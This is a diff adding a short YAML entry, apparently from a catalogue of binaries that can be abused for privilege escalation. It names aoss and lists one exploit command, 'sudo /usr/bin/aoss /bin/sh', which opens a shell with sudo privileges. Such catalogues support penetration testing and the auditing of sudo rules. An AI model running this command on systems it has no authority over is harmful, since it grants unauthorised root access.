@@ -1,0 +1,4 @@
+name: aoss
+binary_path: /usr/bin/aoss
+exploit_cmds:
+- sudo /usr/bin/aoss /bin/sh
